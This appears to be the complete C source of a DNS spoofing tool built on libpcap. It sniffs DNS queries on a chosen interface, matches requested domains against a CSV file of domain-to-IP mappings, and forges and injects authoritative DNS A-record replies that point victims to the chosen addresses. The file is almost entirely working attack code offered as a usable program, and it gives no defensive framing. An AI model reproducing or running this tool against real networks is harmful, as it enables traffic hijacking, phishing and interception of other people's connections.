#include "dns_protocol.h"

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define MAX_DOMAINS 256
#define MAX_LINE_LEN 256

#define BYTES_PER_LINE 16

// ANSI color macros
#define COLOR_HEADER "\033[1;34m" // Bold Blue
#define COLOR_RESET "\033[0m"
#define COLOR_LABEL "\033[1;33m" // Bold Yellow
#define COLOR_DATA "\033[0;37m"  // Light gray

typedef struct {
  char domain[128];
  char ip[INET_ADDRSTRLEN];
} DomainMapEntry;

int            domain_count = 0;
DomainMapEntry domain_map[MAX_DOMAINS];

void print_usage(const char *progname) {
  // clang-format off
  printf("Usage: %s [-i interface] [-f domain_map_file]\n", progname);
  printf("Options:\n");
  printf("  -i <interface>        Specify network interface to listen on (optional)\n");
  printf("  -f <file>             Path to domain_IP mapping file (CSV format) (mandatory)\n");
  printf("  -h                    Show this help message\n");
  // clang-format on
}

int load_domain_map(const char *filename) {
  FILE *fp = fopen(filename, "r");
  if (!fp) {
    perror("Error: Could not open domain map file");
    return -1;
  }

  char line[MAX_LINE_LEN];
  while (fgets(line, sizeof(line), fp)) {
    // Remove trailing newline
    line[strcspn(line, "\n")] = '\0';
    // Split on comma
    char *comma = strchr(line, ',');
    if (!comma) {
      fprintf(stderr, "Warning: Skipping invalid line (missing comma): %s\n", line);
      continue;
    }

    *comma       = '\0';
    char *domain = line;
    char *ip     = comma + 1;

    if (domain_count >= MAX_DOMAINS) {
      fprintf(stderr, "Error: Too many domain mappings (limit %d)\n", MAX_DOMAINS);
      break;
    }
    strncpy(domain_map[domain_count].domain, domain, sizeof(domain_map[domain_count].domain) - 1);
    domain_map[domain_count].domain[sizeof(domain_map[domain_count].domain) - 1] = '\0';
    strncpy(domain_map[domain_count].ip, ip, sizeof(domain_map[domain_count].ip) - 1);
    domain_map[domain_count].ip[sizeof(domain_map[domain_count].ip) - 1] = '\0';
    domain_count++;
  }

  fclose(fp);
  printf("Loaded %d domain mapping(s).\n", domain_count);
  return 0;
}

const char *choose_interface(const char *requested_if) {
  char        errbuf[PCAP_ERRBUF_SIZE];
  pcap_if_t  *alldevs, *dev;
  const char *selected_if = NULL;

  // Find all network devices
  if (pcap_findalldevs(&alldevs, errbuf) == -1) {
    fprintf(stderr, "Error finding devices: %s\n", errbuf);
    return NULL;
  }

  if (alldevs == NULL) {
    fprintf(stderr, "No network interfaces found.\n");
    return NULL;
  }

  if (requested_if) {
    // Try to find matching inteface name
    for (dev = alldevs; dev; dev = dev->next) {
      if (strcmp(dev->name, requested_if) == 0) {
        selected_if = dev->name;
        break;
      }
    }

    if (!selected_if) {
      fprintf(stderr, "Error: Interface %s not found.\n", requested_if);
      pcap_freealldevs(alldevs);
      return NULL;
    }
  } else {
    // No interface provided: list all and select first
    printf("\n+----------------------------------------+\n");
    printf("| No interface provided.                 |\n");
    printf("| Available interfaces:                  |\n");
    printf("+----------------------------------------+\n");
    for (dev = alldevs; dev != NULL; dev = dev->next) {
      printf("- %s\n", dev->name);
    }
    selected_if = alldevs->name;
    printf("+----------------------------------------+\n");
    printf("Defaulting to first: %s\n\n", selected_if);
  }

  // After hours of debugging:
  // pcap_freealldevs frees the memory assocaited with dev->name
  char *selected_if_copy = NULL;
  if (selected_if) selected_if_copy = strdup(selected_if);

  pcap_freealldevs(alldevs);
  return selected_if_copy;
}

// Function to calcualte IP checksum
// Sum 16-bit wrods and folds any carreis baack into the sum.
uint16_t calculate_ip_checksum(const void *vdata, size_t length) {
  const uint16_t *data = (const uint16_t *)vdata;
  uint32_t        sum  = 0;

  // Sum all 16-bit words
  while (length > 1) {
    sum += *data++;
    length -= 2;
  }

  // Add left-over byte, if any
  if (length == 1) sum += *((uint8_t *)data);

  // Fold 32-bit sum to 16-bits
  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);

  // One's complement of the sum
  return (uint16_t)(~sum);
}

// Function to send a spoofed DNS A record response
void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_hdr,
                             const struct ip *ori_ip_hdr, const struct udphdr *ori_udp_hdr,
                             const uint8_t *ori_dns_payload, int ori_qname_offset_in_dns_payload,
                             int ori_qname_data_len_in_packet, const char *spoofed_ip_str) {
  // Calculate fixed header sizes
  const int ETH_HDR_SIZE = sizeof(struct ether_header);
  const int IP_HDR_SIZE  = sizeof(struct ip);
  const int UDP_HDR_SIZE = sizeof(struct udphdr);
  const int DNS_HDR_SIZE = sizeof(dns_header_t);

  // Calculate the total size of the original DNS question section
  // QNAME bytes consumed + QTYPE + QCLASS
  int ori_question_section_size = ori_qname_data_len_in_packet + sizeof(uint16_t) * 2;

  // Calculate the size of the DNS Answer section for an A record:
  // Name (2 bytes for compression pointer) + TYPE (2) + CLASS (2) + TTL (4) + RDLENGTH (2) + RDATA
  // (4 for IPv4)
  const int DNS_ANSER_A_REC_SIZE = sizeof(uint16_t) + sizeof(dns_rr_fixed_part_t) + 4;

  // Estimate total response packet size
  // Max DNS packet size (512) + headers
  // Using `ori_dns_length` for the question, but adding a fixed answer section
  // Let's use a generous buffer for safety :D
  const int MAX_RESPONSE_PACKET_SIZE = ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE + DNS_HDR_SIZE +
                                       ori_question_section_size + DNS_ANSER_A_REC_SIZE;

  uint8_t *response_packet = (uint8_t *)malloc(MAX_RESPONSE_PACKET_SIZE);
  if (!response_packet) {
    perror("Error: Failed to allocate memory for response packet");
    return;
  }
  memset(response_packet, 0, MAX_RESPONSE_PACKET_SIZE); // Zero out the buffer

  // Pointers to the headers within our response_packet buffer
  struct ether_header *eth_resp_hdr = (struct ether_header *)response_packet;
  struct ip           *ip_resp_hdr  = (struct ip *)(response_packet + ETH_HDR_SIZE);
  struct udphdr *udp_resp_hdr = (struct udphdr *)(response_packet + ETH_HDR_SIZE + IP_HDR_SIZE);
  dns_header_t  *dns_resp_hdr =
      (dns_header_t *)(response_packet + ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE);
  uint8_t *dns_resp_paylaod = (uint8_t *)dns_resp_hdr; // Start of DNS payload

  // --- 1. Construct Ethernet Header ---
  // Swap source and destination MAC addresses
  memcpy(eth_resp_hdr->ether_dhost, ori_eth_hdr->ether_shost, ETHER_ADDR_LEN);
  memcpy(eth_resp_hdr->ether_shost, ori_eth_hdr->ether_dhost, ETHER_ADDR_LEN);
  eth_resp_hdr->ether_type = htons(ETHERTYPE_IP);

  // --- 2. Construct IP Header ---
  ip_resp_hdr->ip_v   = 4;
  ip_resp_hdr->ip_hl  = IP_HDR_SIZE / 4;
  ip_resp_hdr->ip_tos = 0;
  ip_resp_hdr->ip_id  = ori_ip_hdr->ip_id;
  // ip_resp_hdr->ip_off = htons(IP_DF); // Don't Fragment
  ip_resp_hdr->ip_ttl = 64;
  ip_resp_hdr->ip_p   = IPPROTO_UDP;
  ip_resp_hdr->ip_sum = 0; // Will be updated later
  // Swap source and destination IP addresses
  ip_resp_hdr->ip_src.s_addr = ori_ip_hdr->ip_dst.s_addr;
  ip_resp_hdr->ip_dst.s_addr = ori_ip_hdr->ip_src.s_addr;

  // --- 3. Construct UDP Header ---
  udp_resp_hdr->uh_sport = htons(DNS_PORT);
  udp_resp_hdr->uh_dport = ori_udp_hdr->uh_sport;
  udp_resp_hdr->uh_sum   = 0; // TODO: Implement UDP Checksum

  // --- 4. Construct DNS Header ---
  dns_resp_hdr->id =
      ((const dns_header_t *)ori_dns_payload)->id; // Transaction ID should match Query ID.
  // Set DNS flags for successful authoritative response
  // QR=1 (Response), Opcode=0 (Standard Query), AA=1 (Authoritative Answer),
  // RD=1 (Recursive Desired, copy from query), RA=1 (Recursion Available), RCODE=0 (No Error)
  uint16_t resp_flags = DNS_FLAG_QR_MASK | DNS_FLAG_AA_MASK | DNS_RCODE_NOERROR;
  // Copy RD bit from original query
  if (ntohs(((const dns_header_t *)ori_dns_payload)->flags) & DNS_FLAG_RD_MASK)
    resp_flags |= DNS_FLAG_RD_MASK;
  // Set RA (TODO: Check if we can set this if RD is not set)
  resp_flags |= DNS_FLAG_RA_MASK;

  dns_resp_hdr->flags   = htons(resp_flags);
  dns_resp_hdr->qdcount = htons(1);
  dns_resp_hdr->ancount = htons(1);
  dns_resp_hdr->nscount = htons(0);
  dns_resp_hdr->arcount = htons(0);

  // --- 5. Copy DNS Quesiton Section ---
  // The question section is located immediately after the DNS header in the original query
  // ori_qname_offset_in_dns_payload is the offset of the QNAME from the start of the DNS payload
  // Total length of the question section: QNAME (variable) + QTYPE (2) + QCLASS (2)
  memcpy(dns_resp_paylaod + DNS_HDR_SIZE, ori_dns_payload + ori_qname_offset_in_dns_payload,
         ori_question_section_size);

  // --- 6. Add DNS Answer Section ---
  // the answer section starts after the question section
  uint8_t *current_offset_in_dns_payload =
      dns_resp_paylaod + DNS_HDR_SIZE + ori_question_section_size;

  // Name: Use a compression pointer to the QNAME in the question section
  // The QNAME starts at offset DNS_HDR_SIZE (12 bytes) from the beginning of the DNS payload
  uint16_t name_ptr = htons(DNS_LABEL_COMPRESSION_MASK | DNS_HDR_SIZE); // 0xC00C
  memcpy(current_offset_in_dns_payload, &name_ptr, sizeof(name_ptr));
  current_offset_in_dns_payload += sizeof(name_ptr);

  // Fixed part of RR
  dns_rr_fixed_part_t answer_rr;
  answer_rr.rtype    = htons(DNS_TYPE_A);
  answer_rr.rclass   = htons(DNS_CLASS_IN);
  answer_rr.ttl      = htonl(60); // TODO: Implement as user input
  answer_rr.rdlength = htons(4);

  memcpy(current_offset_in_dns_payload, &answer_rr, sizeof(dns_rr_fixed_part_t));
  current_offset_in_dns_payload += sizeof(dns_rr_fixed_part_t);

  // RDATA: The spoofed IPv4 addresse
  struct in_addr spoofed_ip_addr;
  if (inet_pton(AF_INET, spoofed_ip_str, &spoofed_ip_addr) != 1) {
    fprintf(stderr, "Error: Invalid spoofed IP address: %s\n", spoofed_ip_str);
    free(response_packet);
    return;
  }

  memcpy(current_offset_in_dns_payload, &spoofed_ip_addr.s_addr, sizeof(spoofed_ip_addr.s_addr));
  current_offset_in_dns_payload += sizeof(spoofed_ip_addr.s_addr);

  // --- 7. Finalize Lenghts and Checksum ---
  int dns_resp_length   = (int)(current_offset_in_dns_payload - dns_resp_paylaod);
  ip_resp_hdr->ip_len   = htons(IP_HDR_SIZE + UDP_HDR_SIZE + dns_resp_length);
  udp_resp_hdr->uh_ulen = htons(UDP_HDR_SIZE + dns_resp_length);

  // Calculate IP header checksum
  ip_resp_hdr->ip_sum = calculate_ip_checksum(ip_resp_hdr, IP_HDR_SIZE);

  // --- 8. Inject the crafted packet ---
  int total_packet_len = ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE + dns_resp_length;

  if (pcap_inject(handle, response_packet, total_packet_len) == -1) {
    fprintf(stderr, "Error: Injecting packet: %s\n", pcap_geterr(handle));
  }
}

// Convert DNS name format to dotted domain (e.g: 3www6google3com0 ->
// www.google.com) Returns: bytes consumed in payload if successful, or -1 or
// error. Fills 'ouput' with the human-readable domain name
//
// !!! IMPORTANT: This function does NOT handle DNS compression pointers (0xC0
// prefix).
// !!! For a robust DNS parser, compression handling (often recursive) is
// required.
// !!! This is a known limitation for now.
int parse_dns_query_name(const uint8_t *payload, int payload_len, int offset, char *output,
                         int max_len) {
  int current_pos             = offset; // Current reading position in DNS payload
  int output_idx              = 0;      // Current writing position in the output buffer
  int bytes_consumed_in_field = 0;      // Bytes from 'offset' this function consumed for the QNAME

  while (current_pos < payload_len) {
    uint8_t len_byte = payload[current_pos];

    // !!! CRITICAL LIMITATION: Does NOT handle compression pointers (0xC0
    // prefix)
    if ((len_byte & DNS_LABEL_COMPRESSION_MASK) == DNS_LABEL_COMPRESSION_MASK) {
      fprintf(stderr, "Error: DNS compression pointer encountered but not "
                      "handled by parse_dns_query_name. Skipping packet.\n");
      output[0] = '\0';
      return -1; // Indicate error for now.
    }

    if (len_byte == 0) {
      bytes_consumed_in_field++; // Account for the null terminator byte
      current_pos++;             // Advance past the null terminator
      break;                     // End of domain name
    }

    // Check bounds for label length
    if (current_pos + len_byte + 1 > payload_len) { // +1 for the length byte itself
      fprintf(stderr, "Error: Malformed DNS name (label length out of bounds).\n");
      output[0] = '\0'; // Ensure output is empty
      return -1;
    }

    // Append label to output with a dot if not the first label
    if (output_idx > 0) {
      if (output_idx + 1 >= max_len) { // Check for space for '.'
        fprintf(stderr, "Error: Output buffer too small for domain name.\n");
        output[0] = '\0';
        return -1;
      }
      output[output_idx++] = '.'; // Add dot separator
    }

    // Copy label bytes
    for (int i = 0; i < len_byte; i++) {
      if (output_idx >= max_len - 1) { // -1 for null terminator
        fprintf(stderr, "Error: Output buffer too small for domain name.\n");
        output[0] = '\0';
        return -1;
      }
      output[output_idx++] = payload[current_pos + 1 + i]; // +1 to skip length byte itself
    }
    bytes_consumed_in_field += (1 + len_byte); // Account for the label's length byte + label data
    current_pos += (1 + len_byte);             // Advance pointer past length byte and label data
  }

  output[output_idx] = '\0'; // Null-terminate the string

  return bytes_consumed_in_field; // Return total bytes consumed from the
                                  // starting offset for this QNAME field
}

void print_dns_packet_info(const struct ip *ip_hdr, const struct udphdr *udp_hdr,
                           const uint8_t *dns_payload, int dns_length,
                           const struct pcap_pkthdr *p_pkt_hdr, const char *queried_domain,
                           uint16_t qtype, uint16_t qclass, const char *spoofed_ip) {
  char       time_str[64];
  time_t     pkt_time = p_pkt_hdr->ts.tv_sec;
  struct tm *ltime    = localtime(&pkt_time);
  strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", ltime);

  // Extract IPs and Ports
  char src_ip[INET_ADDRSTRLEN];
  char dst_ip[INET_ADDRSTRLEN];
  inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
  inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
  uint16_t src_port = ntohs(udp_hdr->uh_sport);
  uint16_t dst_port = ntohs(udp_hdr->uh_dport);

  // Start output
  // clang-format off
    printf(COLOR_HEADER "\n=============================================\n" COLOR_RESET);
    if (spoofed_ip) {
        printf(COLOR_LABEL "🚨 DNS SPOOF EVENT!         " COLOR_RESET "(%d bytes)\n", dns_length);
    } else {
        printf(COLOR_LABEL "📦 DNS Query Detected        " COLOR_RESET "(%d bytes)\n", dns_length);
    }
    printf(COLOR_LABEL "⏰ Timestamp:                " COLOR_RESET "%s.%06ld\n", time_str, p_pkt_hdr->ts.tv_usec);
    printf(COLOR_LABEL "🔹 From:                     " COLOR_RESET "%s:%d\n", src_ip, src_port);
    printf(COLOR_LABEL "🔸 To:                       " COLOR_RESET "%s:%d\n", dst_ip, dst_port);
    printf(COLOR_LABEL "🔍 Query:                    " COLOR_RESET "%s\n", queried_domain);
    printf(COLOR_LABEL "   Type:                     " COLOR_RESET "%hu ", qtype);
    switch (qtype) {
        case DNS_TYPE_A: printf("(A)\n"); break;
        case DNS_TYPE_AAAA: printf("(AAAA)\n"); break;
        case DNS_TYPE_MX: printf("(MX)\n"); break;
        case DNS_TYPE_NS: printf("(NS)\n"); break;
        case DNS_TYPE_CNAME: printf("(CNAME)\n"); break;
        case DNS_TYPE_PTR: printf("(PTR)\n"); break;
        case DNS_TYPE_TXT: printf("(TXT)\n"); break;
        case DNS_TYPE_SRV: printf("(SRV)\n"); break;
        default: printf("(UNKNOWN)\n"); break;
    }
    printf(COLOR_LABEL "   Class:                    " COLOR_RESET "%hu ", qclass);
    switch (qclass) {
        case DNS_CLASS_IN: printf("(IN)\n"); break;
        case DNS_CLASS_CH: printf("(CH)\n"); break;
        case DNS_CLASS_HS: printf("(HS)\n"); break;
        default: printf("(UNKNOWN)\n"); break;
    }

    if (spoofed_ip) {
        printf(COLOR_LABEL "➡️ Spoofed to IP:          " COLOR_RESET "%s\n", spoofed_ip);
    }
    printf(COLOR_HEADER "=============================================\n" COLOR_RESET);

    // Optional: Hex dump of the DNS payload for deeper debugging
    printf(COLOR_LABEL "Offset   Hex Bytes                                 | ASCII\n" COLOR_RESET);
    printf(COLOR_HEADER "--------------------------------------------------------|----------------\n" COLOR_RESET);
    for (int i = 0; i < dns_length; i += BYTES_PER_LINE) {
        printf("%04x:   ", i);
        for (int j = 0; j < BYTES_PER_LINE; j++) {
            if (i + j < dns_length)
                printf("%02x ", dns_payload[i + j]);
            else
                printf("   ");
        }
        printf(" | ");
        for (int j = 0; j < BYTES_PER_LINE && i + j < dns_length; j++) {
            unsigned char c = dns_payload[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("\n");
    }
    printf(COLOR_HEADER "=============================================\n" COLOR_RESET);
  // clang-format on
}

void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
                        const u_char *raw_packet) {
  pcap_t *handle = (pcap_t *)user;

  const struct ether_header *eth_hdr;
  const struct ip           *ip_hdr;
  const struct udphdr       *udp_hdr;
  const uint8_t             *dns_payload;

  // Parse Ethernet header
  eth_hdr = (const struct ether_header *)raw_packet;
  if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) return;

  // Parse IP header
  ip_hdr                 = (const struct ip *)(raw_packet + sizeof(struct ether_header));
  uint32_t ip_header_len = ip_hdr->ip_hl * 4;
  // Basic IP length validation
  if (ip_header_len < 20 || ip_header_len > ip_hdr->ip_len * 4) return;

  // Only process UDP packets
  if (ip_hdr->ip_p != IPPROTO_UDP) return;

  // Parse UDP header
  udp_hdr = (const struct udphdr *)((const uint8_t *)ip_hdr + ip_header_len);

  // Filter for DNS packets (UDP src or dst port = 53)
  if (ntohs(udp_hdr->uh_dport) != DNS_PORT && ntohs(udp_hdr->uh_sport) != DNS_PORT) return;

  // Get DNS payload pointer and length
  dns_payload         = (const uint8_t *)udp_hdr + sizeof(struct udphdr);
  uint32_t dns_length = ntohs(udp_hdr->uh_ulen) - sizeof(struct udphdr);

  // Only process DNS packet
  if (dns_length < sizeof(dns_header_t)) return;
  const dns_header_t *dns_header = (const dns_header_t *)dns_payload;

  // Get the flags
  uint16_t flags_host = ntohs(dns_header->flags);

  // Fliter for DNS Queries (QR bit = 0)
  if (flags_host & 0x8000) return;

  // Get number of questions
  uint16_t qdcount = ntohs(dns_header->qdcount);
  if (qdcount == 0) return;
  if (qdcount > 1) {
    fprintf(stderr,
            "Warning: DNS query with multiple questions (%hu) "
            "received.\nProcessing only "
            "the first for now.\n",
            qdcount);
  }

  char     queried_domain[DNS_MAX_NAME_LENGTH + 1];
  uint32_t current_dns_offset =
      sizeof(dns_header_t); // Start of Question section is after the DNS header

  // Parse the doamin name
  int name_len_in_packet = parse_dns_query_name(dns_payload, dns_length, current_dns_offset,
                                                queried_domain, sizeof(queried_domain));
  if (name_len_in_packet < 0) {
    fprintf(stderr, "Error: Failed to parse domain name. Skipping packet.\n");
    return;
  }

  // Store the initial offset of the QNAME for the response
  int initial_qname_offset_in_dns_payload = current_dns_offset;

  // Advance past the QNAME to get to QTYPE and QCLASS
  current_dns_offset += name_len_in_packet;

  // Check bounds for QTYPE and QCLASS (2 bytes each)
  if (current_dns_offset + sizeof(u_int16_t) * 2 > dns_length) {
    fprintf(stderr, "Error: DNS packet too short for QTYPTE/QCLASS. Skipping packet\n");
    return;
  }

  // Extract QTYPE and QCLASS
  const uint8_t *qtype_ptr = dns_payload + current_dns_offset;
  uint16_t       qtype     = ntohs(*(const uint16_t *)qtype_ptr);
  uint16_t       qclass = ntohs(*(uint16_t *)(dns_payload + current_dns_offset + sizeof(uint16_t)));

  // printf(COLOR_LABEL "Queried domain:         " COLOR_RESET "%s\n", queried_domain);

  // printf("QTYPE: %hu, QCLASS: %hu\n", qtype, qclass);

  int delete_me = 12;
  // Check for A record and match with doamin map
  if (qtype == DNS_TYPE_A && qclass == DNS_CLASS_IN) {
    for (int i = 0; i < domain_count; i++) {
      if (strcasecmp(queried_domain, domain_map[i].domain) == 0) {
        // printf("TODO: Inject Response: %s --> %s\n", domain_map[i].domain, domain_map[i].ip);
        send_dns_spoof_response(handle, eth_hdr, ip_hdr, udp_hdr, dns_payload,
                                initial_qname_offset_in_dns_payload, name_len_in_packet,
                                domain_map[i].ip);
        if (delete_me % 2 == 1)
          print_dns_packet_info(ip_hdr, udp_hdr, dns_payload, dns_length, pkt_header,
                                queried_domain, qtype, qclass, domain_map[i].ip);
        break;
      }
    }
  }
}

int main(int argc, char **argv) {
  char *iface     = NULL;
  char *file_path = NULL;
  int   opt;

  opterr = 0;

  while ((opt = getopt(argc, argv, "i:f:h")) != -1) {
    switch (opt) {
    case 'i':
      iface = optarg;
      break;
    case 'f':
      file_path = optarg;
      break;
    case 'h':
      print_usage(argv[0]);
      return 0;
    case '?':
      if (optopt == 'i' || optopt == 'f')
        fprintf(stderr, "Error: Option '-%c' requires an arguments.\n", optopt);
      else
        fprintf(stderr, "Error: Unknown option -%c\n", optopt);
      print_usage(argv[0]);
      return 1;
    }
  }

  // After the while loop, optind is the index of the first non-option argument.
  // We handle this case here.
  if (optind < argc) {
    fprintf(stderr, "Error: Unexpected non-option arguments provided.\n");
    for (int index = optind; index < argc; index++) {
      fprintf(stderr, "Non-option argument: %s\n", argv[index]);
    }
    print_usage(argv[0]);
    return 1;
  }

  if (!file_path) {
    fprintf(stderr, "Error: Domain map file not specified. Use -f option.\n");
    print_usage(argv[0]);
    return 1;
  }

  if (load_domain_map(file_path) != 0) return 1;

  const char *selected_if = choose_interface(iface);
  if (!selected_if) return 1;

  printf("Using interface: %s\n", selected_if);
  printf("+----------------------------------------+\n");

  char errbuf[PCAP_ERRBUF_SIZE];
  // Open the selected interface for packet capture
  pcap_t *handle = pcap_open_live(selected_if, 65535, 1, 1000, errbuf);
  if (!handle) {
    fprintf(stderr, "Error: Failed to open interface '%s':\n%s\n", selected_if, errbuf);
    free((char *)selected_if);
    return 1;
  }

  free((char *)selected_if);

  printf("Successfully opened interface '%s' for packet capture.\n",
         iface ? iface : "(default iface)");

  // Set up BPF filter for DNS (UDP port 53)
  struct bpf_program dns_filter;
  const char         filter_exp[] = "port 53";
  bpf_u_int32        net_mask     = PCAP_NETMASK_UNKNOWN;

  // Compile the BPF filter
  if (pcap_compile(handle, &dns_filter, filter_exp, 0, net_mask) == -1) {
    fprintf(stderr, "Error: Failed to compile filter %s:\n%s\n", filter_exp, pcap_geterr(handle));
    pcap_close(handle);
    return 1;
  }

  // Install the BPF
  if (pcap_setfilter(handle, &dns_filter) == -1) {
    fprintf(stderr, "Error: Failed to set filter %s:\n%s\n", filter_exp, pcap_geterr(handle));
    pcap_freecode(&dns_filter);
    pcap_close(handle);
    return 1;
  }

  printf("Starting packet capture on %s...\nPress Ctrl+C to stop.\n",
         iface ? iface : "(default interface)");

  // Start packet capture loop, call packet_handler for each packet
  pcap_loop(handle, -1, dns_packet_handler, (u_char *)handle);

  pcap_freecode(&dns_filter);
  pcap_close(handle);
  return 0;
}
